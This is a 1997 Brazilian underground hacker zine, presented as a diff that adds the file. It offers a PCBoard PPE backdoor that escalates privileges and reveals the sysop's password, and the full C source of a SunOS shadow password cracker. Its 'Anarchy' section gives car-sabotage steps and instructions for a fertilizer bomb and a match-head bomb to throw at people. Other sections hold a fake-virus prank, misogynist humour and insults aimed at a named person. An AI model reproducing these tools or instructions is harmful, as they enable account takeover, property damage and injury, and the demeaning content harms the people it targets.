@@ -1,0 +1,949 @@
+
+            ####   ##     ######## ## ####   ## #######
+          ##    ## ##          ### ## ## ##  ## ##
+          ##    ## ##        ###   ## ##  ## ## #######
+          ######## ##     ###      ## ##   #### ##
+          ##    ## ###### ######## ## ##    ### #######
+          <Allansoft zine: The underground brazilian zine>
+
+
+Alzine - revista mensal ( todos dia 01 nos melhores sites underground
+do Brasil).
+
+   
+Alzine, 01 de Novembro de 1997
+
+#######################################################################
+
+
+Oi gentalha! Viram!? Como prometido, o zine fcou pronto dia 1 de
+Novembro! Só pra quebrar a tradição neh?!
+Bom, como vc pode ver, cada dia saem mais e mais zines underground
+por aí, e eh isso mesmo que tem que acontecer! Porra! Mas se forem
+zines fraquinhos (Ex: "DOV") ai então não vale a pena.
+O zine desse mês estah uma maravilha de bom, repleto de sources de
+virii entre outras coisas novas!
+Vamos deixar de papo furado e comecar logo essa merdah!
+
+                                  Hasta-La-Vista-Babe!
+PS: Para melhor visualização deste documento sugiro o uso de olhos!
+Se você for um LAMER (Ex: Gabrieldov), aperte as teclas "Alt+F4"
+}---------------------------------------------------------------------{
+INDICE:
+1-Especial! Rotina de backdoor para PCBOARD
+2-PPE, faça seu proprio ENTER!
+3-Virus em PASCAL
+4-Source de um DESENCRIPTADOR DE SENHAS!
+5-ANARCHY!! No 2!
+6-Humor
+}---------------------------------------------------------------------{
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+1-Especial! Rotina de backdoor para PCBOARD
+
+Bem, esta eh uma rotina bem simples, quando colocada dentro de um
+PPE mostra para o user remoto o nome e a senha do sysop!
+Voce pode coloca-la num local, qdo apertada uma certa letra ela e
+mostrada, etc... sabe... Entao... acho que todo mundo que conhece um
+minimo de PPLC (que nao sao como um certo Gabrieldov que eu conheco)
+conhece essa rotina, mas se voce nao sabe e preciva usa-la, ai vai:
+
+Bem ai vai a rotina do BACKDOOR!!!!
+---------------------Corte aqui BACKDOOR.PPS---------------------------
+; BACKDOOR. coloque isto no meio de um ppe como uma letra para mandar
+; para uma rotina e rodar este BACKDOOR!
+; este serve p/ voce ver o nome e senha do SYSOP
+ 
+    GetUser
+    U_Sec = 231
+    AdjTime 9999
+    PutUser
+    GetAltUser 1
+    AnsiPos 1, 1
+    MPrintLn "@X0FsYsOp nAmE"
+    MPrintLn "@X09" + U_Name()
+    MPrintLn "@X0FpAsSwOrD"
+    MPrintLn "@X09" + U_Pwd
+    MPrintLn ""
+    wait
+-----------------------------Corte Aqui--------------------------------
+Pronto ai esta a rotina, coloque no PPE e foda os lamers burros que
+compram o BBS montado, nao sabem montar e ficam se achando dizendo que
+montaram tudo, sabem tudo, ficam te tirando e falam que sao hackers...
+(EX: Gabrieldov)
+HEHEHEH
+Backdoor by: LamaHunter
+-----------------------------------------------------------------------
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+2-PPE, faça seu proprio ENTER!
+
+Esta parte do Allansoft Zine ensina voce a fazer um PPE de ENTER!!!
+PPE's de ENTER sao legais para colocar no BBS, chamam a atencao e
+sao muito faceis de se fazer.
+Mas voce diz: Eu nao sei programar em PPLC! Eu sou um lamer Gabrieldov
+trouxa que nem PPLC sei!
+E dai??? Quem sabe programar em PPLC com certeza sabe fazer um ENTER                
+portanto, esta explicado passo a passo, voce nao precisa saber nada
+de PPE, que vai conseguir fazer um ENTER, porque aki eu ensinarei o
+basico da programacao...
+
+Entao vamos la... inicio do FAQ...
+
+Faq by: LamaHunter
+
+    
+   Primeiro voce precisa de um programa de editor de texto . Nao  vai
+pegando o Word, prefira um Edit do  MS-DOS, ou um  bloco de Notas do
+Windows. No final da FAQ tem uma tabela de Cores para voce nao ficar
+na mao.
+ 
+   Agora que voce ja sabe onde comecar, entao vamos ao que interessa!
+   Para comecar o programa, precisara entrar com variaveis. E  o  que
+seria variavel? bom, uma variavel seria tipo seu bolso que transporta
+dinheiro, etc... isso eh que a variavel carrega, so' que informacoes.
+   Vamos colocar como variavel a palavra comando. Ela surtirah efeito
+com mais uma palavra que se chama "String", que seria o tipo da
+variavel a ser usada.
+   Ex. como vai ficar: String comando
+   Apos colocar a variavel, voce precisa  entrar  com  as  sequencias
+do programa, tipo diretorios do MS-DOS, que seriam: :inicio e :fim.
+Estes comandos sao nada mais do que uns elevadores para ir de um lado
+a outro.
+   Como fazer o programa?
+   Bem, entao vamos a programacao de um PPE.
+       Programa de Enter para PCBoard
+    ------------------------------------------------------------
+ 
+   String Comando
+ 
+ :Inicio
+   AnsiPos 30, gety()
+   Print "@X01][@X0Fpress enter@X01][@X07"
+   Delay 3
+   Comando = InKey()
+   If (Comando == Chr(13)) Goto Fim
+   AnsiPos 30, gety()
+   Print "@X01][@X0FPRESS ENTER@X01][@X07"
+   Delay 3
+   If (Comando == Chr(13)) Goto Fim
+   Goto Inicio
+ :Fim
+   KbdStuff Chr(13)
+   End
+ 
+    ------------------------------------------------------------
+   Se caso voce quiser faze-lo, ele vai funcionar.
+   Ja na 3a linha, voce ve um AnsiPos, ele eh que vai mostrar a osi-
+cao do prompt quando ele for chamado. o num 30 eh a coluna onde  ele
+vai aparecer. E no GetY() este esta pegando a informacao da linha.
+   Por exemplo, quando voce der enter em um comando do PCBoard, aca-
+ba pedindo para dar um enter, eh ai que o GetY() entra. Ele pega a
+posicao da linha para onde ele vai.
+   No comando 'Print "][press enter][" ' este eh o  comando  com  que
+vai ser mostrado na tela que seria ][press enter][ . OBS: nunca deixe
+sem aspas este comando pois nao funcionara sem eles. Ai eh que entram
+as cores, com os comandos @X01 para Azul, @X0F para Branco,  e  assim
+vai. Numca deixe estes comandos de cores antes ou depois  das  aspas,
+deixem no meio delas senao nao funcionara.
+   Jah o Delay, ele eh encarregado de fazer a contagem de espera para
+entrar com outra informacao.
+   No ' Comando = InKey() ' este esta  fazendo  com  que  a  variavel
+Comando fique vazia tipo desvaziar o bolso, para entrar com algo mais
+tarde.
+  O comando ' IF (Comando == Chr(13)) Goto Fim ' esta nos  dizendo  o
+seguinte: Se ( Comando eh igual ao enter ), vai para o fim (pq Goto=
+go to). Este eh o comando mais importante do programa, porque ele eh
+que diz se  entrou o comando esperado ou nao, e se entrou onde ele
+deve ir.
+  Depois que terminar os comandos, antes de colocarmos o final, temos
+de fazer com que quando nao der o enter, ele fique parado  executando
+o programa como um loop, entao, no  final  digite  ' Goto Inicio '
+este eh o comando chave para que nao termine o  programa  sem  que  o
+usuario nao executar o comando.
+  Ai vai repetindo os comandos na medida que voce  desejar  e  depois
+vem o final.
+  Para que o PPLC possa entender o programa quando vai terminar e pra
+onde ele tem que ir, precisamos fazer um tipo de bloco. E como  fazer
+este bicho?
+  Bom, coloque um ' : ' antes e digite fim assim oh
+   :Fim
+  Ai depois vem o kbdStuff, e o que seria?
+   O comando KbdStuff eh um executador de comandos e ele esta mandando
+executar o enter ( chr(13) ), e termine o programa com  um  ' end '  e
+bom  dovertimento! Esta criado o seu primeiro PPE!!!:))
+   Acho que ajudei bastante a Fazer seu proprio PPE.
+
+    Maiores informacoes mande um mail para: 'allanrai@geocities.com'
+
+
+Tabela de cores:
+preto  Azul  Verde  vrde/agua  vermel  pink  marr.  cinza/cl  cinz/esc
+ @X00  @X01   @X02     @X03     @X04    @X05 @X06     @X07      @X08
+ 
+  azul/cla  verde/claro  vd/ag/claro verm/claro   rosa   amarelo   branco
+    @X09        @X0A        @X0B        @X0C      @X0D     @X0E     @X0F
+
+Pronto!
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+3-Virus em PASCAL
+
+Simulacao de virus em PASCAL, basta compilar para rodar, assusta o
+lamer, simula travar o CPU do coitado como se fosse um jogo! Feito
+e enviado por LamaHunter. Aqui vai o SOURCE CODE desta simulacao de
+virus, divirta-se!
+Para compilar use o TURBO PASCAL 5.0 em diante. Nao mudem este prog.
+somente aprenda com ele.
+Se voce eh muito ruin de programacao (Ex: Gabrieldov), isso sera legal
+pra vc!
+
+Inicio:
+;Language: PASCAL (TURBO PASCAL)
+;Created by: LamaHunter
+;Date: 11/97
+;Specil to Allansoft
+-----------------------Corte aqui BUG.PAS-----------------------------------
+program alsoft_virii_simul;
+uses crt;
+var
+x:array[1..100] of integer;
+j:integer;
+t,t2:char;
+begin
+clrscr;
+writeln('               Allansoft Zine Package for DOS      Versão 1.0');
+delay(33000);
+writeln('(c) Copyright 1997 Allansoft inc. ');
+writeln('Todos os direitos reservados.');
+writeln;
+delay(44000);delay(44440);
+clrscr;
+write('Iniciando a instalação:');write('.');delay(50000); write('.');delay(50000);
+write('.');delay(30000);write('.');delay(50000);
+write('.');delay(30000);write('.');delay(30000);write('.');
+write('.');delay(50000);write('.');delay(30000);delay(60000);
+writeln;
+clrscr;
+writeln;
+writeln('Checando espaço disponível em disco para começar a instalação:');
+     for j:=1 to 100 do
+      begin
+      gotoxy(7,3);
+      write(j,'% checked     ');
+      delay(4000);
+      end;
+        delay(2000);
+        writeln;
+        writeln;
+        writeln;
+        writeln('Atenção! O vírus Michellangelo foi encontrado em seu computador ');
+        delay(20000);
+        writeln;
+        Writeln('          Impossível achar COMMAND.COM! Sistema Paralizado');
+          for j:=1 to 100 do
+          delay (50000);
+            writeln;
+            Writeln ('Ta assustado LAMER??? HAHAHA!');
+            nosound;
+end.
+-------------------------Fim do corte---------------------------------------
+Pronto, tah ai o seu viruzinho em pascal e nao me enche mais o saco!
+by: LamaHunter
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+4-Source de um DESENCRIPTADOR DE SENHAS!
+
+Atencao! Esta parte do zine nao eh de autoria da Allansoft!
+Essa é a fonte de um desencriptador de senhas do arquivo shadow padrao 
+SUNOS.
+O desencriptador e´um programa que apartir de uma wordlist e um arquivo 
+com  as senhas encriptadas ( e´ claro) recria o valor dos codigos dando 
+assim o login com seu respectivo password.
+
+Corte a linha abaixo e cole em um arquivo vazio, para isso use um
+editor de textos, logo apos compile ele.
+Nao fomos nos que fizemos, devemos creditos a The Shining/UPi
+(UK Division)
+
+
+---CORTE AQUI----------------------------------------------------------
+
+/* Program   : Shadow Crack
+   Author    : (c)1996 The Shining/UPi (UK Division)
+   Date      : Released 12/4/96
+   Unix type : Somente para arquivos shadowed do sistema SUNOS */
+
+#include <stdio.h>
+#include <pwd.h>
+#include <string.h>
+#include <ctype.h>
+#include <signal.h>
+
+#define WORDSIZE 20     /* Tamanho maximo da palavra */
+#define OUTFILE "data"  /* Arquivo que armazena info. da conta crackeada */
+
+void word_strat( void ), do_dict( void );
+void add_nums( char * ), do_comment( char * );
+void try_word( char * ), reverse_word( char * );
+void find_mode( void ), burst_mode( void );
+void mini_burst( void ), brute_force( void );
+void user_info( void ), write_details( char * );
+void pwfile_name( void ), disable_interrupts( void ), cleanup();
+
+
+char *logname, *comment, *homedir, *shell, *dict, *mode,
+     *pwfile, *pwdauth();
+struct passwd *getpwnam(), *pwentry;
+extern char *optarg;
+int option, uid, gid;
+
+
+int main( int argc, char **argv )
+{
+disable_interrupts();
+system("clear");
+
+if (argc < 2) {
+printf("Shadow Crack - (c)1996 The Shining\n");
+printf("SUNOS Shadow password brute force cracker\n\n");
+printf("useage: %s -m[mode] -p[pwfile] -u[loginid] ", argv[0]);
+printf("-d[dictfile]\n\n\n");
+printf("[b] is burst mode, scans pwfile trying minimum\n");
+printf("    password strategies on all i.d's\n\n");
+printf("[i] is mini-burst mode, scans pwfile trying both\n");
+printf("    userid, gecos info, and numbers to all i.d's\n\n");
+printf("[f] is bruteforce mode, tries all above stategies\n");
+printf("    as well as dictionary words\n\n");
+printf("[pwfile]   Uses the password file [pwfile], default\n");
+printf("           is /etc/passwd\n\n");
+printf("[loginid]  Account you wish to crack, used with\n");
+printf("           -mf bruteforce mode only\n\n");
+printf("[dictfile] uses dictionary file [dictfile] to\n");
+printf("           generate passwords when used with\n");
+printf("           -mf bruteforce mode only\n\n");
+exit(0);
+}
+
+
+/* Get options from the command line and store them in different
+   variables */
+
+while ((option = getopt(argc, argv, "m:p:u:d:")) != EOF)
+ switch(option)
+ {
+   case 'm':
+	   mode = optarg;
+	   break;
+
+   case 'p':
+	   pwfile = optarg;
+	   break;
+
+   case 'u':
+	   logname = optarg;
+	   break;
+
+   case 'd':
+	   dict = optarg;
+	   break;
+
+   default:
+	   printf("wrong options\n");
+	   break;
+ }
+
+find_mode();
+}
+
+
+/* Routine to redirect interrupts */
+
+void disable_interrupts( void )
+{
+signal(SIGHUP, SIG_IGN);
+ signal(SIGTSTP, cleanup);
+  signal(SIGINT, cleanup);
+ signal(SIGQUIT, cleanup);
+signal(SIGTERM, cleanup);
+}
+
+
+/* If CTRL-Z or CTRL-C is pressed, clean up & quit */
+
+void cleanup( void )
+{
+FILE *fp;
+
+if ((fp = fopen("gecos", "r")) != NULL)
+   remove("gecos");
+
+if ((fp = fopen("data", "r")) == NULL)
+   printf("\nNo accounts cracked\n");
+
+printf("Quitting\n");
+exit(0);
+}
+
+
+/* Function to decide which mode is being used and call appropriate
+   routine */
+
+void find_mode( void )
+{
+ if (strcmp(mode, "b") == NULL)
+    burst_mode();
+ else
+ if (strcmp(mode, "i") == NULL)
+    mini_burst();
+ else
+ if (strcmp(mode, "f") == NULL)
+    brute_force();
+ else
+  {
+    printf("Sorry - No such mode\n");
+    exit(0);
+  }
+}
+
+
+/* Get a users information from the password file */
+
+void user_info( void )
+{
+  uid = pwentry->pw_uid;
+   gid = pwentry->pw_gid;
+    comment = pwentry->pw_gecos;
+   homedir = pwentry->pw_dir;
+  shell = pwentry->pw_shell;
+}
+
+
+
+/* Set the filename of the password file to be used, default is
+   /etc/passwd */
+
+void pwfile_name( void )
+{
+if (pwfile != NULL)
+    setpwfile(pwfile);
+}
+
+
+
+/* Burst mode, tries user i.d. & then reverses it as possible passwords
+   on every account found in the password file */
+
+void burst_mode( void )
+{
+pwfile_name();
+setpwent();
+
+  while ((pwentry = getpwent()) != (struct passwd *) NULL)
+  {
+     logname = pwentry->pw_name;
+      user_info();
+      try_word( logname );
+     reverse_word( logname );
+  }
+
+endpwent();
+}
+
+
+/* Mini-burst mode, try above combinations as well as other strategies
+   which include adding numbers to the end of the user i.d. to generate
+   passwords or using the comment field information in the password
+   file */
+
+void mini_burst( void )
+{
+pwfile_name();
+setpwent();
+
+  while ((pwentry = getpwent()) != (struct passwd *) NULL)
+  {
+     logname = pwentry->pw_name;
+      user_info();
+     word_strat();
+  }
+
+endpwent();
+}
+
+
+/* Brute force mode, uses all the above strategies as well using a
+   dictionary file to generate possible passwords */
+
+void brute_force( void )
+{
+pwfile_name();
+setpwent();
+
+  if ((pwentry = getpwnam(logname)) == (struct passwd *) NULL) {
+     printf("Sorry - User unknown\n");
+     exit(0);
+  }
+  else
+  {
+     user_info();
+      word_strat();
+     do_dict();
+  }
+
+endpwent();
+}
+
+
+/* Calls the various password guessing strategies */
+
+void word_strat()
+{
+ try_word( logname );
+  reverse_word( logname );
+   add_nums( logname );
+  do_comment( comment );
+}
+
+
+/* Takes the user name as its argument and then generates possible
+   passwords by adding the numbers 0-9 to the end. If the username
+   is greater than 7 characters, don't bother */
+
+void add_nums( char *wd )
+{
+int i;
+char temp[2], buff[WORDSIZE];
+
+if (strlen(wd) < 8) {
+
+  for (i = 0; i < 10; i++)
+  {
+      strcpy(buff, wd);
+       sprintf(temp, "%d", i);
+	strcat(wd, temp);
+       try_word( wd );
+      strcpy(wd, buff);
+  }
+
+ }
+}
+
+
+
+/* Gets info from the 'gecos' comment field in the password file,
+   then process this information generating possible passwords from it */
+
+void do_comment( char *wd )
+{
+FILE *fp;
+
+char temp[2], buff[WORDSIZE];
+int c,  flag;
+
+flag = 0;
+
+
+/* Open file & store users gecos information in it. w+ mode
+   allows us to write to it & then read from it. */
+
+if ((fp = fopen("gecos", "w+")) == NULL) {
+    printf("Error writing gecos info\n");
+   exit(0);
+}
+
+    fprintf(fp, "%s\n", wd);
+   rewind(fp);
+
+strcpy(buff, "");
+
+
+/* Process users gecos information, separate words by checking for the
+   ',' field separater or a space. */
+
+while ((c = fgetc(fp)) != EOF)
+{
+
+ if (( c != ',' ) && ( c != ' ' )) {
+     sprintf(temp, "%c", c);
+    strncat(buff, temp, 1);
+ }
+ else
+    flag = 1;
+
+
+   if ((isspace(c)) || (c == ',') != NULL) {
+
+     if (flag == 1) {
+	c=fgetc(fp);
+
+	if ((isspace(c)) || (iscntrl(c) == NULL))
+	   ungetc(c, fp);
+     }
+
+     try_word(buff);
+      reverse_word(buff);
+       strcpy(buff, "");
+      flag = 0;
+     strcpy(temp, "");
+   }
+
+}
+fclose(fp);
+remove("gecos");
+}
+
+
+
+/* Takes a string of characters as its argument(in this case the login
+   i.d., and then reverses it */
+
+void reverse_word( char *wd )
+{
+char temp[2], buff[WORDSIZE];
+int i;
+
+i = strlen(wd) + 1;
+ strcpy(temp, "");
+strcpy(buff, "");
+
+ do
+ {
+    i--;
+    if ((isalnum(wd[i]) || (ispunct(wd[i]))) != NULL) {
+	sprintf(temp, "%c", wd[i]);
+       strncat(buff, temp, 1);
+    }
+
+ } while(i != 0);
+
+if (strlen(buff) > 1)
+   try_word(buff);
+}
+
+
+
+/* Read one word at a time from the specified dictionary for use
+   as possible passwords, if dictionary filename is NULL, ignore
+   this operation */
+
+void do_dict( void )
+{
+FILE *fp;
+char buff[WORDSIZE], temp[2];
+int c;
+
+strcpy(buff, "");
+strcpy(temp, "");
+
+
+if (dict == NULL)
+   exit(0);
+
+   if ((fp = fopen(dict, "r")) == NULL) {
+       printf("Error opening dictionary file\n");
+      exit(0);
+   }
+
+rewind(fp);
+
+
+ while ((c = fgetc(fp)) != EOF)
+ {
+  if ((c != ' ') || (c != '\n')) {
+     strcpy(temp, "");
+      sprintf(temp, "%c", c);
+     strncat(buff, temp, 1);
+  }
+
+  if (c == '\n') {
+    if (buff[0] != ' ')
+       try_word(buff);
+
+      strcpy(buff, "");
+  }
+ }
+
+fclose(fp);
+}
+
+
+/* Process the word to be used as a password by stripping \n from
+   it if necessary, then use the pwdauth() function, with the login
+   name and word to attempt to get a valid id & password */
+
+void try_word( char pw[] )
+{
+int pwstat, i, pwlength;
+char temp[2], buff[WORDSIZE];
+
+strcpy(buff, "");
+pwlength = strlen(pw);
+
+for (i = 0; i != pwlength; i++)
+{
+
+ if (pw[i] != '\n') {
+     strcpy(temp, "");
+     sprintf(temp, "%c", pw[i]);
+    strncat(buff, temp, 1);
+ }
+}
+
+ if (strlen(buff) > 3 ) {
+     printf("Trying : %s\n", buff);
+
+     if (pwstat = pwdauth(logname, buff) == NULL) {
+	 printf("Valid Password! - writing details to 'data'\n");
+
+	 write_details(buff);
+
+	if (strcmp(mode, "f") == NULL)
+	   exit(0);
+     }
+ }
+}
+
+
+
+/* If valid account & password, store this, along with the accounts
+   uid, gid, comment, homedir & shell in a file called 'data' */
+
+void write_details( char *pw )
+{
+FILE *fp;
+
+if ((fp = fopen(OUTFILE, "a")) == NULL) {
+    printf("Error opening output file\n");
+   exit(0);
+}
+
+fprintf(fp, "%s:%s:%d:%d:", logname, pw, uid, gid);
+ fprintf(fp, "%s:%s:%s\n", comment, homedir, shell);
+fclose(fp);
+}
+
+---CORTE AQUI-----------------------------------------------------------
+
+Bom... pra compilar isso escreva:
+
+$ gcc shcrack.c -o shcrack
+
+Ou tente!
+
+$ acc shcrack.c -o shcrack
+
+Isso pode variar dependendo do seu compilador.
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+5-ANARCHY!! No 2!
+
+Pois eh pessoal! Essa eh a segunda parte do Anarchy da Allansoft!
+Divirtam-se com essas belezinhas!
+
+Como mandar um carro para o inferno!    
+----------------------------------------------
+
+Existem mil maneiras de destruir um carro mas lembre-se que isso pode
+ser divertido para voce, destrutivo para alguem e dificil dos policiais
+pegar.
+
+- Coloque uma bomba de CO2 perto do tanque de gasolina. 
+
+- Coloque sujeira, acucar ( esse e´ bom ), uma bolinha de ping-pong 
+ou alguma coisa que dissolva no tanque de gasolina.
+
+- Plastico deforma  e dilue dentro do tanque. O resultado final e 
+dificuldade de injetar gasolina. Causando possivelmente a troca da 
+valvula.
+
+- Uma boa e coloca, pedras, bananas, alguma coisa que  vai tampar
+dentro do cano de descarga.
+  * Use um pedaco de pau para empurrar para dentro.
+
+- Coloque um fio comprido no tanque de gasolina e acenda ele.
+
+- Roube a chave, tire uma copia, coloque ela no lugar novamente e roube
+o som do carro.
+
+- Expelhos restrovisores sao muito facil de ser arrancados. Geralmente 
+empurrando do lado expelhado eles quebram.
+
+- Faca uma bola de DUREPOX com 3 ou 4 pregos, coloque em baixo do pneu.
+
+- Pode tambem usar um anel para arranhar as portas.
+
+Como fazer uma bomba de fertilizante
+---------------------------------------------
+
+Ingredientes:
+
+- Jornal
+- Fertilizante ( escolha o tipo quimico )
+- Algodao 
+- Diesel ( combustivel ) 
+
+Faca um montinho de jornal e coloque um pouco de fertilizante dentro.
+Coloque algodao sobre ele e entao ensope o  algodao com o diesel.
+Acenda e depois corra como voce nunca correu antes. A explosao é 
+violenta portanto nao faca isso em ambiente fechados.
+
+Bola de tenis bomba
+---------------------
+
+Ingredientes:
+
+- Milhoes de cabeca de palito
+- Uma bola de tenis
+- Uma faca bem afiada
+- Fita bem forte
+
+Depois de arrancar uma tonelada de cabeca de palito de fosforo corte um 
+PEQUENO buraco em uma bola de tenis.
+Encha a bola com as cabecas de palitos ate nao ter mais espaco nenhum.
+Fique certo que isso e´muito legal mesmo!
+Bom, quando voce ver algum amigo andando na rua jogue nele. Ele vai le-
+var o maior susto com o estouro.
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+6-Humor
+PS: Enviado por WOH, nao pela Allansoft...
+
+        *** MANUAL DA H.O.M.E.M. ***
+
+  CAPITULO I - A H.O.M.E.M. E O HOMEM
+
+  O QUE E' A H.O.M.E.M. ???
+
+  A H.O.M.E.M. (Honrada Organizacao Mundial dos Especialistas em Mulheres) e'
+uma Organizacao sem fins lucrativos, apenas informativos. Ela foi criada com
+o intuito de haver um maior intercambio de informacoes entre seus associados
+visto que as informacoes que se tem sobre as mulheres sao muito difusas e in-
+certas.
+  Esta publicacao tem como meta tornar-se um ponto de consulta para qualquer
+problema ou duvida que haja a respeito da arte de se conhecer a psicologia,
+habitos, preferencias, melhores posicoes, tudo que concerne a  respeito  das
+mulheres.
+
+  O MEMBRO DA H.O.M.E.M. NO MUNDO
+
+  Aqueles homens que tornan-se "Objeto" jamais torna-se um "MEMBRO" da H.O.M.
+E.M.
+  Entretanto, temos que convir que um "MEMBRO" desta luminosa organizacao e'
+um "HOMEM COM OBJETO", afinal, se assim nao o fosse nao poderia ser um MEMBRO
+DA H.O.M.E.M.
+ Em realidade, o que as mulheres realmente anelam nao e' um "HOMEM OBJETO",mas
+sim o "OBJETO DO HOMEM", o que e' deveras natural, coisa que deveria ser in-
+centivada.
+ Deus (GLASH) criou o OBJETO DO HOMEM para que ele emulasse a sua propria ima-
+gem. O OBJETO DO HOMEM foi erijido para a gloria da especie humana. O OBJETO
+DO HOMEM foi erguido para que preenchesse o "VAZIO INTERIOR DAS MULHERES".
+ Pior que um HOMEM OBJETO so mesmo um "HOMEM ABJETO". Este ultimo e' o tipo
+que jamais leu "MANUAL DE INTRODUCAO SEXUAL" dos INTELECTUAIS DE ALCOVA da H.
+O.M.E.M
+ O MEMBRO da H.O.M.E.M. e' assim mesmo: entrao, intrometido.
+ Em geral, com tendencia de esquerda, pode tambem ser de direita, so nao pode
+ser de centro, nem ser mole.
+ O MEMBRO tem que ser durao, as vezes um tanto escorregadio, mas sempre firme
+em seus posicionamentos.
+ Extremamente sensivel ao vai-e-vem dos acontecimentos, sabe vestir a camisa
+quando e por uma boa causa.
+ Isto porque a H.O.M.E.M. e' um ORGAO muito atuante, que vai fundo nos rela-
+cionamentos e nao mija pra tras quando a situacao esquenta.
+ Sempre leal, jamais ataca pela retaguarda, sabe lutar frente-a-frente, ate o
+final.
+        
+ CAPITULO II - O QUE E' MULHER
+
+ II.1)Definicao Religiosa
+
+ Mulher, na concepcao original do Criador, naquele dia em que Ele acrodou ins-
+pirado, seria uma mistura de Kelly LeBrook a Daryl Hannah acrescentando-se um
+fator Cindy Crawford. O resto e' tudo copia mal feita.
+
+ II.2)Definicao Cientifica
+
+ Sao seres basicamente compostos de Seios, Coxas e Bundas. Ha' noticias (nao
+confirmadas), de que ja' foram avsitados alguns especimes que tinham cerebro.
+Havera', por parte da H.O.M.E.M., uma profunda investigacao para provar a ve-
+racidade de tao estupefante e alarmante fato.
+ Estes seres tem um tremendo medo de baratas, segundo os estudos da H.O.M.E.M
+e alem de ser muito sensivel, consta tambem que o sangue da barata assemelha-
+se ao da mulher.
+
+ II.3)Algumas definicoes e principios sobre a mulher
+
+ Para entende-las, faz-se necessario o conhecimento de alguns principios enun-
+ciados por prolificos pensadores da alma feminina como Jesse Valadao, Rambo,
+Don Juan e outros.
+ Vejam que para entender esses seres imprevisiveis chamados "mulher", so' po-
+deria ser decifrado com a ajuda de uma delas. No caso a minuscula pensadora
+Gloria Steinen:
+
+ "Uma mulher sem um homem e' como um peixe sem uma bicicleta"
+
+ As mulheres, principalmente as do passado, ainda conseguiam emular(*1) algu-
+ma inteligencia, como podemos notar pelas opinioes da Madame Anne Louise Ger-
+maine de Stael, nascida em 1766:
+ (*1) Como elas nao tem, tentam fazer parecer que tem.
+
+ "Alegro-me por nao ser Homem, ja' que sendo-o teria que me casar com uma mu-
+lher."
+
+ Ate' os livros sagrados falam das ditas cujas. Nas palavras de Sharp, refe-
+rindo-se ao Alcorao:
+
+ "No principio, Ala' tomou uma maca, um lirio, uma rola, uma serpente, um pou-
+co de mel, uma fruta do Mar Morto, e um punhado de argila. Quando olhou para
+a amalgama era uma mulher"
+
+ Mas e' na Biblia que vamos encontrar a melhor definicao do que seja a mulher
+Sao Paulo em suas epistolas aos Corintios (Timao!Timao!), no capitulo 11, ver-
+siculo 7, outorga:
+
+ "A Mulher e' a gloria do VARAO"
+
+ Complementando, com o pensamento indesviavel de H.L.Meneken, que liquida com
+esta polemica:
+
+ "So' ha' uma coisa na qual homens e mulheres concordam: Nenhum deles confia
+em mulheres..."
+
+ Mas nao resisto a tentacao de fazer uma ultima citacao neste levantamento his-
+torico, que imputo a Oscar Wilde:
+
+ "As mulheres nos amam por nossos defeitos. Se os tivermos em boa quantidade,
+elas nos perdoarao tudo, ate mesmo nossos gigantescos intelectos.
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+Bom people, por esse mez jah chega! Jah tem muita merda inutil e eu jah
+perdi muito tempode vida para escrever essa bosta e eu to ansioso para ir
+à Porto Seguro! Ah! não avisem a polícia de que eu to lah!
+TCHAU!...
+Ah, aqui estao os padroes Allansoft...
+Home Page: http://www.geocities.com/siliconvalley/way/7029
+mail: allanrai@geocities.com
+Aguardem o DOMÍNIO da Allansoft! (Pq ele nunca vai existir!)
+
+END OF TASK!!----------------------------------------------------------
